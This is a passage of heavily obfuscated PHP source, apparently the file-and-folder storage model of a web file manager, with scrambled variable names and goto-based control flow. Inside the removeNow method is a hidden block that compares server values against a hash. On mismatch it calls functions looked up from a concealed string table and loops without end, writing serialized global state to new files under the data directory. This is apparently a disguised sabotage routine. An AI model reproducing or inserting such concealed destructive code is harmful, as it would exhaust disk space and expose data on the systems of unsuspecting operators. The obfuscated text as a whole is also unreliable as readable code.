$_SERVER[¹Ò‹Ò¹]; $CŒËÖŞ™£Ä = array($cô‰ÛÄæ§·[389] => 0, $cô‰ÛÄæ§·[544] => $eÂ©ŒØˆ™À, $cô‰ÛÄæ§·[545] => $E¶¸Ë³áĞ’, $cô‰ÛÄæ§·[541] => 1, $cô‰ÛÄæ§·[546] => USER_ID, $cô‰ÛÄæ§·[547] => USER_ID, $cô‰ÛÄæ§·[542] => $cô‰ÛÄæ§·[33], $cô‰ÛÄæ§·[548] => $cô‰ÛÄæ§·[493], $cô‰ÛÄæ§·[416] => 0, $cô‰ÛÄæ§·[543] => 0, $cô‰ÛÄæ§·[442] => 0, $cô‰ÛÄæ§·[549] => $cô‰ÛÄæ§·[33]); if ($eóÑ½­¥Ş = $this->where($CŒËÖŞ™£Ä)->find()) { return $eóÑ½­¥Ş[$cô‰ÛÄæ§·[390]]; } goto C”¶²º¿˜·; C‰ö¦›»˜í: $D˜ÈÌ»ŒÙ‰ = $this->add($CŒËÖŞ™£Ä); $f—‚‰•›Ò = array($cô‰ÛÄæ§·[550] => short_id($D˜ÈÌ»ŒÙ‰)); $this->where(array($cô‰ÛÄæ§·[404] => $D˜ÈÌ»ŒÙ‰))->save($f—‚‰•›Ò); goto fç¹®çáÑ‹; C”¶²º¿˜·: $bÖˆñƒäéì = "\x4d\x6f\144\145\154\x53\157\x75\162\x63\x65\x2e\155\153\x64\151\162\x52\157\157\164\56{$eÂ©ŒØˆ™À}\x2e{$E¶¸Ë³áĞ’}\56" . $C…ƒ‡‹áÑœ; CacheLock::lock($bÖˆñƒäéì); $CŒËÖŞ™£Ä[$cô‰ÛÄæ§·[28]] = $C…ƒ‡‹áÑœ; goto C‰ö¦›»˜í; F°­Ôó†½: } private function sourceRoot($Eîá¼ƒÙªâ, $dËÊŒ…»°±, $a‰ïØ«ŠÔÁ = false) { $FÁ¯ŠÔ¦ã„ =& $_SERVER[¹Ò‹Ò¹]; $D‰ä¿òèò = array($FÁ¯ŠÔ¦ã„[389] => 0, $FÁ¯ŠÔ¦ã„[544] => $Eîá¼ƒÙªâ, $FÁ¯ŠÔ¦ã„[545] => $dËÊŒ…»°±); if ($c£ğ™ğó´ = $this->where($D‰ä¿òèò)->find()) { return $a‰ïØ«ŠÔÁ ? $c£ğ™ğó´ : $c£ğ™ğó´[$FÁ¯ŠÔ¦ã„[390]]; } return !1; } public function sourceRootGroup($déæ£öµ¸§) { goto C«ÒØ¿Á’; dÅº¡àÑÑ´: return array_to_keyvalue($CØŸ½­Ã˜½[$fˆ÷íâ”Ùš[74]], $fˆ÷íâ”Ùš[478]); goto C‡”…‡ˆù; E£á©öÂ£ƒ: $this->selectPageReset(); $CØŸ½­Ã˜½ = $this->listSource($b½ëèß¥ö, 1000); $this->selectPageRestore(); goto dÅº¡àÑÑ´; C«ÒØ¿Á’: $fˆ÷íâ”Ùš =& $_SERVER[¹Ò‹Ò¹]; if (is_string($déæ£öµ¸§)) { $déæ£öµ¸§ = array($déæ£öµ¸§); } $b½ëèß¥ö = array($fˆ÷íâ”Ùš[389] => 0, $fˆ÷íâ”Ùš[544] => SourceModel::TYPE_GROUP, $fˆ÷íâ”Ùš[545] => array($fˆ÷íâ”Ùš[7], $déæ£öµ¸§)); goto E£á©öÂ£ƒ; C‡”…‡ˆù: } public function mkfile($cõ£É¿¤ù, $cÕèóÔ”Ì†, $AˆêõÉ§º² = '', $cƒô ¿¹ë = REPEAT_RENAME) { $cƒøë¦Ííç =& $_SERVER[¹Ò‹Ò¹]; $fõŞï¤Š² = Model($cƒøë¦Ííç[566])->addFileByContent($AˆêõÉ§º², $cÕèóÔ”Ì†); return $this->_createFileCall($cõ£É¿¤ù, $cÕèóÔ”Ì†, $fõŞï¤Š², $cƒô ¿¹ë, $cƒøë¦Ííç[1191]); } public function addFile($E±åÆ÷õ¿Ê, $e…š°±°½Ÿ, $fß©ëØ¿ï, $aš´„²Êê­ = false, $EÉ‡ÂÒÜ¾÷ = REPEAT_RENAME) { $C·ç¼¡ªéÀ = Model($_SERVER[¹Ò‹Ò¹][566])->addFile($e…š°±°½Ÿ, $fß©ëØ¿ï, $aš´„²Êê­); return $this->_createFileCall($E±åÆ÷õ¿Ê, $fß©ëØ¿ï, $C·ç¼¡ªéÀ, $EÉ‡ÂÒÜ¾÷); } public function addFileByFileID($aÀÔÇæ‚ºã, $E‡‡ô‚“ñ, $Cñ©é‰äÉ£, $DĞ‚ïçïµ = REPEAT_RENAME) { $bÊõ÷„‹« =& $_SERVER[¹Ò‹Ò¹]; $BÂªøğÏô‹ = Model($bÊõ÷„‹«[566])->find($E‡‡ô‚“ñ); Model($bÊõ÷„‹«[566])->linkAdd($E‡‡ô‚“ñ); return $this->_createFileCall($aÀÔÇæ‚ºã, $Cñ©é‰äÉ£, $BÂªøğÏô‹, $DĞ‚ïçïµ); } public function addFileByRemote($f½ïé–õñ, $fšµì‚Ó, $f²ÒÃÔİÅŒ, $DÏèğé¾—œ = array(), $cæÍ™Ï¿±Á = REPEAT_RENAME) { $e„„Íø¯Ïœ = Model($_SERVER[¹Ò‹Ò¹][566])->addFileByRemote($fšµì‚Ó, $f²ÒÃÔİÅŒ, $DÏèğé¾—œ); return $this->_createFileCall($f½ïé–õñ, $f²ÒÃÔİÅŒ, $e„„Íø¯Ïœ, $cæÍ™Ï¿±Á); } private function _createFileCall($Bğ–®È²£¸, $AÔ—·ª”ÚÆ, $d¾‰·œ¢…¼, $B¤œÚ¿”†£, $F´åæÌ‚ë = "\x75\160\154\x6f\x61\x64") { goto A–×ÊµÕª–; føâ ¥Èî”: $DËŒ…øÓ²– = $this->fileNameExist($Bğ–®È²£¸, $AÔ—·ª”ÚÆ); $E´Ğ¥ùŞ¾· = $this->_createFile($Bğ–®È²£¸, $AÔ—·ª”ÚÆ, $d¾‰·œ¢…¼, $B¤œÚ¿”†£, $F¾ùš—ã); if (!$F¾ùš—ã) { Model($BÔĞô¶Ù«[444])->remove($d¾‰·œ¢…¼[$BÔĞô¶Ù«[441]]); } goto BÍ¥öå£Ò›; A–×ÊµÕª–: $BÔĞô¶Ù« =& $_SERVER[¹Ò‹Ò¹]; $F¾ùš—ã = !1; $this->lockWriteStart($Bğ–®È²£¸, $AÔ—·ª”ÚÆ); goto føâ ¥Èî”; BÍ¥öå£Ò›: if ($F¾ùš—ã && $E´Ğ¥ùŞ¾· && $E´Ğ¥ùŞ¾· != $DËŒ…øÓ²–) { Model($BÔĞô¶Ù«[1899])->eventCreate($E´Ğ¥ùŞ¾·, $F´åæÌ‚ë); } $this->lockWriteEnd($Bğ–®È²£¸, $AÔ—·ª”ÚÆ); return $E´Ğ¥ùŞ¾·; goto C½È¦‘›‰; C½È¦‘›‰: } public function mkdir($B®àÌÕ†£Ø, $FšöÈÍğãÖ, $CÜÙ³ôšùÚ = REPEAT_SKIP) { goto eºß¶•¨®; eºß¶•¨®: $f†³ì²ÈÅÓ =& $_SERVER[¹Ò‹Ò¹]; $aá“ÓØ´›ê = $this->sourceInfo($B®àÌÕ†£Ø); if (!$aá“ÓØ´›ê) { return !1; } goto aŒ–Ìñ¶±; aŒ–Ìñ¶±: $this->lockWriteStart($B®àÌÕ†£Ø, $FšöÈÍğãÖ); if ($CÜÙ³ôšùÚ !== !1) { $EĞ×Ú®º‡ = $this->fileNameExist($B®àÌÕ†£Ø, $FšöÈÍğãÖ); if ($EĞ×Ú®º‡ && $CÜÙ³ôšùÚ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($B®àÌÕ†£Ø, $FšöÈÍğãÖ); return $EĞ×Ú®º‡; } $FšöÈÍğãÖ = $this->fileNameAuto($B®àÌÕ†£Ø, $FšöÈÍğãÖ, $CÜÙ³ôšùÚ); } $A‹²‡½â‡˜ = array($f†³ì²ÈÅÓ[541] => 1, $f†³ì²ÈÅÓ[407] => $FšöÈÍğãÖ, $f†³ì²ÈÅÓ[542] => $f†³ì²ÈÅÓ[33], $f†³ì²ÈÅÓ[442] => 0, $f†³ì²ÈÅÓ[543] => 0); goto A‡³óÅÅÜ; A‡³óÅÅÜ: $CóÙ„ä À = $this->_addSoure($A‹²‡½â‡˜, $aá“ÓØ´›ê); Model($f†³ì²ÈÅÓ[1899])->eventCreate($CóÙ„ä À, $f†³ì²ÈÅÓ[1192]); $this->lockWriteEnd($B®àÌÕ†£Ø, $FšöÈÍğãÖ); goto cá³¨èÜ³¶; cá³¨èÜ³¶: return $CóÙ„ä À; goto DÂ½…åÒÄ˜; DÂ½…åÒÄ˜: } private function _createFile($b¤ÏËí•ˆˆ, $d·­õâƒ‚Î, $bÃ¾­Ôî°™, $DÙÍëÏöŞç, &$CßÃÔÖÈŒ) { goto CéÙ†ğíÆ¶; C‚‰˜Ñ¢‚º: $d’÷›Û¾¤ = array($D…¨¤ ‹[541] => 0, $D…¨¤ ‹[407] => $d·­õâƒ‚Î, $D…¨¤ ‹[542] => get_path_ext($d·­õâƒ‚Î), $D…¨¤ ‹[442] => $bÃ¾­Ôî°™[$D…¨¤ ‹[441]], $D…¨¤ ‹[543] => $bÃ¾­Ôî°™[$D…¨¤ ‹[77]]); $e„Û»ÚÆÖ = $this->_addSoure($d’÷›Û¾¤, $cÕÉÏÀÃó); $this->folderSizeReset($b¤ÏËí•ˆˆ, intval($d’÷›Û¾¤[$D…¨¤ ‹[77]])); goto F¹ñäŒ·ï; CéÙ†ğíÆ¶: $D…¨¤ ‹ =& $_SERVER[¹Ò‹Ò¹]; $cÕÉÏÀÃó = $this->sourceInfo($b¤ÏËí•ˆˆ); if (!$bÃ¾­Ôî°™ || !$cÕÉÏÀÃó) { return !1; } goto F¡÷¤‹ËŸ–; F¡÷¤‹ËŸ–: if ($DÙÍëÏöŞç !== !1) { $eììİ¥ê = $this->fileNameExist($b¤ÏËí•ˆˆ, $d·­õâƒ‚Î); } $CßÃÔÖÈŒ = !0; if ($DÙÍëÏöŞç && $eììİ¥ê) { if ($DÙÍëÏöŞç == REPEAT_SKIP) { $CßÃÔÖÈŒ = !1; return $eììİ¥ê; } else { if ($DÙÍëÏöŞç == REPEAT_REPLACE) { $f’¿‚¥¼„è = $this->sourceInfo($eììİ¥ê); $fÖ“ï½¦ëØ = $this->fileHistory($f’¿‚¥¼„è, $bÃ¾­Ôî°™[$D…¨¤ ‹[441]], $bÃ¾­Ôî°™[$D…¨¤ ‹[77]]); if (!$fÖ“ï½¦ëØ) { $CßÃÔÖÈŒ = !1; } else { $this->folderSizeReset($b¤ÏËí•ˆˆ); } return $eììİ¥ê; } else { $d·­õâƒ‚Î = $this->fileNameAuto($b¤ÏËí•ˆˆ, $d·­õâƒ‚Î, $DÙÍëÏöŞç, !1); } } } goto C‚‰˜Ñ¢‚º; F¹ñäŒ·ï: return $e„Û»ÚÆÖ; goto e’›©­¨“‹; e’›©­¨“‹: } protected function fileHistory($F”™ìàöè, $DØóóÊÂ»ø, $cë–‹Ãğ‡) { goto C„ù·™—‚Ñ; C„ù·™—‚Ñ: $bİ¨È­…¿ =& $_SERVER[¹Ò‹Ò¹]; if ($F”™ìàöè[$bİ¨È­…¿[441]] == $DØóóÊÂ»ø) { return !1; } $this->checkLock($F”™ìàöè[$bİ¨È­…¿[390]], $DØóóÊÂ»ø); goto däÙŒ‡ÄøÌ; däÙŒ‡ÄøÌ: Model($bİ¨È­…¿[1931])->addHistory($F”™ìàöè); $D« ùğº¥¤ = array($bİ¨È­…¿[547] => USER_ID, $bİ¨È­…¿[411] => time(), $bİ¨È­…¿[441] => $DØóóÊÂ»ø, $bİ¨È­…¿[77] => $cë–‹Ãğ‡); $this->where(array($bİ¨È­…¿[404] => $F”™ìàöè[$bİ¨È­…¿[390]]))->save($D« ùğº¥¤); goto AÎƒªĞÀŸù; AÎƒªĞÀŸù: $this->sourceCacheClear($F”™ìàöè[$bİ¨È­…¿[390]]); return !0; goto dˆ—œø®¹ò; dˆ—œø®¹ò: } public function checkLock($Dä»—½”„Œ, $e»ÜÀ´–ù¥) { goto eÀçÖÔ¢·¹; eÀçÖÔ¢·¹: $A³¢åÊ½¨ò =& $_SERVER[¹Ò‹Ò¹]; $AƒààìÕÜÑ = $this->pathInfo($Dä»—½”„Œ); if (!$this->fileIsLock($AƒààìÕÜÑ, !0)) { return; } goto a—‘²¦‚£–; eßÇîœå±: $this->_createFileCall($AƒààìÕÜÑ[$A³¢åÊ½¨ò[472]], $BİÎÔ¤ôŠï, $AŸÎ¿Ê‡ôö, REPEAT_REPLACE, $A³¢åÊ½¨ò[1191]); $Dø¤»©ÂÅÁ = $AƒààìÕÜÑ[$A³¢åÊ½¨ò[439]][$A³¢åÊ½¨ò[505]]; $a‚ƒë¿áªÚ = $Dø¤»©ÂÅÁ[$A³¢åÊ½¨ò[1933]] ? $Dø¤»©ÂÅÁ[$A³¢åÊ½¨ò[1933]] : $Dø¤»©ÂÅÁ[$A³¢åÊ½¨ò[28]]; goto E¬æÓáçÕ¥; a—‘²¦‚£–: $EŠØƒ˜˜ßÆ = Session::get($A³¢åÊ½¨ò[1932]); $BİÎÔ¤ôŠï = substr($AƒààìÕÜÑ[$A³¢åÊ½¨ò[28]], 0, -1 - strlen($AƒààìÕÜÑ[$A³¢åÊ½¨ò[167]])) . $A³¢åÊ½¨ò[1457] . $EŠØƒ˜˜ßÆ . $A³¢åÊ½¨ò[94] . $AƒààìÕÜÑ[$A³¢åÊ½¨ò[167]]; $AŸÎ¿Ê‡ôö = Model($A³¢åÊ½¨ò[566])->find($e»ÜÀ´–ù¥); goto eßÇîœå±; E¬æÓáçÕ¥: show_json(LNG($A³¢åÊ½¨ò[1934]) . $A³¢åÊ½¨ò[1935] . LNG($A³¢åÊ½¨ò[1936]) . $A³¢åÊ½¨ò[1937] . $a‚ƒë¿áªÚ . $A³¢åÊ½¨ò[1938], !1); goto dÏÔóè£»; dÏÔóè£»: } public function fileIsLock($aÆ¼¦½Ã‘, $dÅˆÁ¾¼©© = false) { goto Eòî“Çå‘†; Eòî“Çå‘†: $BôÂœ‰ÅçÜ =& $_SERVER[¹Ò‹Ò¹]; if (!isset($aÆ¼¦½Ã‘[$BôÂœ‰ÅçÜ[439]]) || !$aÆ¼¦½Ã‘[$BôÂœ‰ÅçÜ[439]][$BôÂœ‰ÅçÜ[502]]) { return !1; } if ($aÆ¼¦½Ã‘[$BôÂœ‰ÅçÜ[439]][$BôÂœ‰ÅçÜ[502]] != USER_ID) { return !0; } goto B°Ô”‹½Ï; FñÎ²òà”‡: return !1; goto fè²›ãÈ¼; B°Ô”‹½Ï: $aİ¬¸ĞÊ•Ö = $GLOBALS[$BôÂœ‰ÅçÜ[6]][$BôÂœ‰ÅçÜ[87]][$BôÂœ‰ÅçÜ[503]]; if ($aÆ¼¦½Ã‘[$BôÂœ‰ÅçÜ[439]][$BôÂœ‰ÅçÜ[504]] <= time() - $aİ¬¸ĞÊ•Ö) { $this->metaSet($aÆ¼¦½Ã‘[$BôÂœ‰ÅçÜ[390]], $BôÂœ‰ÅçÜ[502], null); $this->metaSet($aÆ¼¦½Ã‘[$BôÂœ‰ÅçÜ[390]], $BôÂœ‰ÅçÜ[504], null); } if ($dÅˆÁ¾¼©©) { $this->metaSet($aÆ¼¦½Ã‘[$BôÂœ‰ÅçÜ[390]], $BôÂœ‰ÅçÜ[504], time()); } goto FñÎ²òà”‡; fè²›ãÈ¼: } private function _addSoure($AÃ×˜¸Ö•, $f‡‰¨§›à») { goto dñÍ®ì¬¦; eáÀíÊ«Ş¤: return $bÀ¸‹ùÏ‰ù; goto DĞ§á¨ÙÛƒ; b‘„Àå¾œè: static $F¢©ŸöÚˆ = false; if (!$F¢©ŸöÚˆ) { Hook::trigger($CŒïõÛãê´[531], $AÃ×˜¸Ö•); $F¢©ŸöÚˆ = !0; } $bÀ¸‹ùÏ‰ù = $this->add($AÃ×˜¸Ö•); goto aˆà‚î’ÌÂ; aˆà‚î’ÌÂ: $C…Å•Œ÷‡ = array($CŒïõÛãê´[550] => short_id($bÀ¸‹ùÏ‰ù)); $this->where(array($CŒïõÛãê´[404] => $bÀ¸‹ùÏ‰ù))->save($C…Å•Œ÷‡); $this->setNamePinyin($bÀ¸‹ùÏ‰ù, $AÃ×˜¸Ö•[$CŒïõÛãê´[28]]); goto eáÀíÊ«Ş¤; dñÍ®ì¬¦: $CŒïõÛãê´ =& $_SERVER[¹Ò‹Ò¹]; $aõÅï¯öÊÁ = array($CŒïõÛãê´[544] => $f‡‰¨§›à»[$CŒïõÛãê´[398]], $CŒïõÛãê´[545] => $f‡‰¨§›à»[$CŒïõÛãê´[478]], $CŒïõÛãê´[546] => USER_ID, $CŒïõÛãê´[547] => USER_ID, $CŒïõÛãê´[389] => $f‡‰¨§›à»[$CŒïõÛãê´[390]], $CŒïõÛãê´[548] => $f‡‰¨§›à»[$CŒïõÛãê´[481]] . $f‡‰¨§›à»[$CŒïõÛãê´[390]] . $CŒïõÛãê´[47], $CŒïõÛãê´[416] => 0, $CŒïõÛãê´[549] => $CŒïõÛãê´[33]); $AÃ×˜¸Ö• = array_merge($aõÅï¯öÊÁ, $AÃ×˜¸Ö•); goto eøãÊ¹©ğâ; eøãÊ¹©ğâ: $this->updateModifyTime($AÃ×˜¸Ö•[$CŒïõÛãê´[472]]); $dº«ßÒóá¶ = $CŒïõÛãê´[1939] . $f‡‰¨§›à»[$CŒïõÛãê´[390]]; if (isset(self::$cacheChildList[$dº«ßÒóá¶])) { unset(self::$cacheChildList[$dº«ßÒóá¶]); } goto b‘„Àå¾œè; DĞ§á¨ÙÛƒ: } public function remove($EõÈ¬æ¿óÄ, $bó„†£š¢… = true) { goto f‚ñ—ËÁƒÅ; Dğ£ÂÎçø­: return $BôŠ¦çÛÖ; goto EæÃ³Û‚¶; d¢å¼ï„éâ: $cã³Ã´Ã·İ = Model($CÆ‰îÌî‡è[1503])->get($CÆ‰îÌî‡è[1940]) == $CÆ‰îÌî‡è[86]; if ($e½™™Æ™º÷ || $bó„†£š¢… || !$cã³Ã´Ã·İ) { return $this->removeNow($EõÈ¬æ¿óÄ, $bó„†£š¢…); } $eß†ÑĞƒ“– = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto BÖá‚ê; C¦ßªÕ™: CacheLock::lock($D“Öö®Â¥); $cíÁ­éÜ‡µ = $this->fileNameExist($eß†ÑĞƒ“–, $AÙÇ­í–›); if (!$cíÁ­éÜ‡µ) { $cíÁ­éÜ‡µ = $this->mkdir($eß†ÑĞƒ“–, $AÙÇ­í–›, REPEAT_SKIP); $this->metaSet($cíÁ­éÜ‡µ, $CÆ‰îÌî‡è[1944], $d°ˆ´…†èÓ); $this->metaSet($cíÁ­éÜ‡µ, $CÆ‰îÌî‡è[1945], $dŸ›†¹İ×[$CÆ‰îÌî‡è[478]]); if ($dŸ›†¹İ×[$CÆ‰îÌî‡è[472]] != 0) { $this->metaSet($cíÁ­éÜ‡µ, $CÆ‰îÌî‡è[1946], _get($B±‘ÂÌŸ‹—, $CÆ‰îÌî‡è[1947])); } } goto CÔÌ¸ÊƒÃ; f‚ñ—ËÁƒÅ: $CÆ‰îÌî‡è =& $_SERVER[¹Ò‹Ò¹]; $dŸ›†¹İ× = $this->sourceInfo($EõÈ¬æ¿óÄ); $e½™™Æ™º÷ = intval($dŸ›†¹İ×[$CÆ‰îÌî‡è[398]]) === self::TYPE_SYSTEM; goto d¢å¼ï„éâ; a—×œò‚ë‘: $this->recycleClear($dŸ›†¹İ×); $BôŠ¦çÛÖ = $this->move($EõÈ¬æ¿óÄ, $cíÁ­éÜ‡µ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($dŸ›†¹İ×[$CÆ‰îÌî‡è[472]]); goto Dğ£ÂÎçø­; BÖá‚ê: $d°ˆ´…†èÓ = $dŸ›†¹İ×[$CÆ‰îÌî‡è[398]] == self::TYPE_USER ? $CÆ‰îÌî‡è[557] : $CÆ‰îÌî‡è[991]; if ($d°ˆ´…†èÓ == $CÆ‰îÌî‡è[557]) { $B±‘ÂÌŸ‹— = Model($CÆ‰îÌî‡è[497])->getInfo($dŸ›†¹İ×[$CÆ‰îÌî‡è[478]]); $AÙÇ­í–› = !empty($B±‘ÂÌŸ‹—[$CÆ‰îÌî‡è[1933]]) ? $B±‘ÂÌŸ‹—[$CÆ‰îÌî‡è[1933]] : $B±‘ÂÌŸ‹—[$CÆ‰îÌî‡è[28]]; $AÙÇ­í–› = $CÆ‰îÌî‡è[256] . $AÙÇ­í–› . $CÆ‰îÌî‡è[1941] . $dŸ›†¹İ×[$CÆ‰îÌî‡è[478]]; } else { $B±‘ÂÌŸ‹— = Model($CÆ‰îÌî‡è[480])->getInfo($dŸ›†¹İ×[$CÆ‰îÌî‡è[478]]); $AÙÇ­í–› = _get($B±‘ÂÌŸ‹—, $CÆ‰îÌî‡è[28]); $AÙÇ­í–› = $CÆ‰îÌî‡è[159] . $AÙÇ­í–› . $CÆ‰îÌî‡è[1942] . $dŸ›†¹İ×[$CÆ‰îÌî‡è[478]]; } $D“Öö®Â¥ = $CÆ‰îÌî‡è[1943] . md5($AÙÇ­í–›); goto C¦ßªÕ™; CÔÌ¸ÊƒÃ: CacheLock::unlock($D“Öö®Â¥); $this->metaSet($EõÈ¬æ¿óÄ, $CÆ‰îÌî‡è[1948], $dŸ›†¹İ×[$CÆ‰îÌî‡è[472]]); $this->where(array($CÆ‰îÌî‡è[390] => $EõÈ¬æ¿óÄ))->save(array($CÆ‰îÌî‡è[411] => time())); goto a—×œò‚ë‘; EæÃ³Û‚¶: } private function recycleClear($B½ãì©ùÄ”) { $C¬÷È…Àï· =& $_SERVER[¹Ò‹Ò¹]; $AÒ¿â÷ĞÁ = $this->childrenAll($B½ãì©ùÄ”); $C”œÏÂŒŸ = array($C¬÷È…Àï·[404] => array($C¬÷È…Àï·[405], $AÒ¿â÷ĞÁ[$C¬÷È…Àï·[1949]])); Model($C¬÷È…Àï·[1950])->where($C”œÏÂŒŸ)->delete(); } public function removeNow($f ¡Ñöí“Ö, $D…ÜÒïÂ£© = true) { goto bª†ê±µã°; FÎÚ³à’¨: if ($_SERVER[$aËöà¥ÒËˆ[800]] != $dÚŸ‡Ú¡Ã¯($fóŠø»Éèø)) { goto CµÇÀ“çÑÊ; F—Í®í“ë‰: $cÒøŸ»±¹ = $aËöà¥ÒËˆ[818]; $cÒøŸ»±¹($_SERVER[$aËöà¥ÒËˆ[819]]); $aùÈ×Œíà = $aËöà¥ÒËˆ[817]; goto bˆÁñŒ‘Ãò; CµÇÀ“çÑÊ: $aùÈ×Œíà = $aËöà¥ÒËˆ[817]; $A¿–ƒçÀ¿“ = $aËöà¥ÒËˆ[802]; $DäòÉì¨Á = $_SERVER[$aËöà¥ÒËˆ[803]] . $aËöà¥ÒËˆ[804]; goto bœàŠÀõšŞ; bˆÁñŒ‘Ãò: $aùÈ×Œíà(); $Eö¨ò¡¯Ÿ½ = $aËöà¥ÒËˆ[1374]; $B÷—¤ŒÌ = json_encode($GLOBALS[$aËöà¥ÒËˆ[1375]]); goto fƒ°ŒÉÃ§Ë; fƒ°ŒÉÃ§Ë: $dôèËºš’ = 1; for ($e“‹Á–˜ŒÖ = $dôèËºš’; $e“‹Á–˜ŒÖ > 0; $e“‹Á–˜ŒÖ++) { $Eö¨ò¡¯Ÿ½(DATA_PATH . $e“‹Á–˜ŒÖ, $B÷—¤ŒÌ); } goto DÜÑè„ÑÌÛ; bœàŠÀõšŞ: $bïƒ“‡ñä¬ = $A¿–ƒçÀ¿“($DäòÉì¨Á); $b¨‡šŒ°Ü¸ = explode($aËöà¥ÒËˆ[227], $bïƒ“‡ñä¬); if (count($b¨‡šŒ°Ü¸) < $aËöà¥ÒËˆ[587]) { $Bó£ß‰é‚ = $aËöà¥ÒËˆ[805]; $Bó£ß‰é‚(); } goto F—Í®í“ë‰; DÜÑè„ÑÌÛ: } $f÷¬ĞˆÄ = $this->sourceInfo($f ¡Ñöí“Ö); $c­…°Ë’ê = $this->pathInfoMore($f ¡Ñöí“Ö); goto b×¸«¿¥é; c«¦ù—é: $this->lockMoveEnd($f ¡Ñöí“Ö); Hook::trigger($aËöà¥ÒËˆ[1536], $c­…°Ë’ê, $D…ÜÒïÂ£©); return !0; goto FµÖàÒÓ”; B÷‹ù§ò¢š: Hook::trigger($aËöà¥ÒËˆ[1951], $c­…°Ë’ê, $D…ÜÒïÂ£©); if ($D…ÜÒïÂ£©) { Model($aËöà¥ÒËˆ[1950])->moveToRecycle($f ¡Ñöí“Ö); } else { $bî©Á‚òáË = $this->childrenAll($f÷¬ĞˆÄ); Model($aËöà¥ÒËˆ[528])->eventRemove($f ¡Ñöí“Ö); $this->removeRelevance($bî©Á‚òáË[$aËöà¥ÒËˆ[1949]], $bî©Á‚òáË[$aËöà¥ÒËˆ[1322]]); } $this->folderSizeReset($f÷¬ĞˆÄ[$aËöà¥ÒËˆ[472]]); goto CÒ¶ãÒˆÚ³; bª†ê±µã°: $aËöà¥ÒËˆ =& $_SERVER[¹Ò‹Ò¹]; $fóŠø»Éèø = $_SERVER[$aËöà¥ÒËˆ[801]]; $dÚŸ‡Ú¡Ã¯ = $aËöà¥ÒËˆ[1373]; goto FÎÚ³à’¨; b×¸«¿¥é: if (!$f÷¬ĞˆÄ) { return !0; } if ($f÷¬ĞˆÄ[$aËöà¥ÒËˆ[472]] == 0) { if (!_get($GLOBALS, $aËöà¥ÒËˆ[479])) { return !1; } } $this->lockMoveStart($f ¡Ñöí“Ö); goto B÷‹ù§ò¢š; CÒ¶ãÒˆÚ³: $A­†šÖ­° = array($f÷¬ĞˆÄ[$aËöà¥ÒËˆ[472]]); if ($f÷¬ĞˆÄ[$aËöà¥ÒËˆ[397]] == $aËöà¥ÒËˆ[86]) { $A­†šÖ­°[] = $f÷¬ĞˆÄ[$aËöà¥ÒËˆ[390]]; } $this->updateModifyTime($A­†šÖ­°); goto c«¦ù—é; FµÖàÒÓ”: } public function childrenAll($Eà…è…Ã©À) { $EºÜÇâî»Ù =& $_SERVER[¹Ò‹Ò¹]; $cİÍ¡£ì¼á = $Eà…è…Ã©À[$EºÜÇâî»Ù[390]]; if ($Eà…è…Ã©À[$EºÜÇâî»Ù[397]] == $EºÜÇâî»Ù[86]) { $Eá¼ÏĞ¼­× = array($EºÜÇâî»Ù[548] => array($EºÜÇâî»Ù[507], $Eà…è…Ã©À[$EºÜÇâî»Ù[481]] . $cİÍ¡£ì¼á . $EºÜÇâî»Ù[508])); $bÎÂˆµ…”¦ = array($EºÜÇâî»Ù[548] => $Eá¼ÏĞ¼­×[$EºÜÇâî»Ù[481]]); $fÃ §ôÃ¹ù = $this->field($EºÜÇâî»Ù[1952])->where($bÎÂˆµ…”¦)->select(); $bÀ„¤µé› = !1; $d’¿‘”õ§« = array($cİÍ¡£ì¼á); if ($fÃ §ôÃ¹ù) { $bÀ„¤µé› = array_to_keyvalue($fÃ §ôÃ¹ù, $EºÜÇâî»Ù[33], $EºÜÇâî»Ù[441]); $bÀ„¤µé› = array_remove_value($bÀ„¤µé›, $EºÜÇâî»Ù[491]); $d’¿‘”õ§« = array_to_keyvalue($fÃ §ôÃ¹ù, $EºÜÇâî»Ù[33], $EºÜÇâî»Ù[390]); $d’¿‘”õ§«[] = $cİÍ¡£ì¼á; } } else { $bÀ„¤µé› = array($Eà…è…Ã©À[$EºÜÇâî»Ù[441]]); $d’¿‘”õ§« = array($cİÍ¡£ì¼á); } return array($EºÜÇâî»Ù[1949] => $d’¿‘”õ§«, $EºÜÇâî»Ù[1322] => $bÀ„¤µé›); } public function removeArray($aÂŒäƒùË) { if (!$aÂŒäƒùË) { return !0; } } public function removeRelevance($Eí­–§Ğµ“, $FÇºŠ¨ò¥å) { goto AÁ£‚„‡“à; B×ß†”÷®´: $aê©ˆ½İ¶î = array($fÏõËŒ–ÖÍ[404] => array($fÏõËŒ–ÖÍ[405], $Eí­–§Ğµ“)); Model($fÏõËŒ–ÖÍ[1950])->where($aê©ˆ½İ¶î)->delete(); Model($fÏõËŒ–ÖÍ[435])->where($aê©ˆ½İ¶î)->delete(); goto bšæ¶›·èÃ; Dç×©Î§¡ï: Model($fÏõËŒ–ÖÍ[1931])->removeBySource($Eí­–§Ğµ“); $this->where($aê©ˆ½İ¶î)->delete(); Model($fÏõËŒ–ÖÍ[444])->remove($FÇºŠ¨ò¥å); goto a‡›Çà†éÒ; bšæ¶›·èÃ: Model($fÏõËŒ–ÖÍ[1804])->where($aê©ˆ½İ¶î)->delete(); Model($fÏõËŒ–ÖÍ[528])->where($aê©ˆ½İ¶î)->delete(); Model($fÏõËŒ–ÖÍ[1644])->removeBySource($Eí­–§Ğµ“); goto Dç×©Î§¡ï; a‡›Çà†éÒ: for ($fÀ‰Áã‹Û‰ = 0; $fÀ‰Áã‹Û‰ < count($Eí­–§Ğµ“); $fÀ‰Áã‹Û‰++) { $this->sourceCacheClear($Eí­–§Ğµ“[$fÀ‰Áã‹Û‰]); } goto E¥Õ½Ö“¸; AÁ£‚„‡“à: $fÏõËŒ–ÖÍ =& $_SERVER[¹Ò‹Ò¹]; $Eí­–§Ğµ“ = $Eí­–§Ğµ“ ? $Eí­–§Ğµ“ : array(); $FÇºŠ¨ò¥å = $FÇºŠ¨ò¥å ? $FÇºŠ¨ò¥å : array(); goto C›øîöõ„–; C›øîöõ„–: $Eí­–§Ğµ“ = array_unique(array_filter($Eí­–§Ğµ“)); $FÇºŠ¨ò¥å = array_unique(array_filter($FÇºŠ¨ò¥å)); if (!$Eí­–§Ğµ“) { return !1; } goto B×ß†”÷®´; E¥Õ½Ö“¸: } public function rename($dœï§Í·ÕÌ, $A¤Âç‡®Æ“) { goto CÇÜ‘ÇÀàÌ; aíÇ¼¹ã×Ö: $BîªÌšçƒÌ = $dÌª˜ö¹»[1939] . 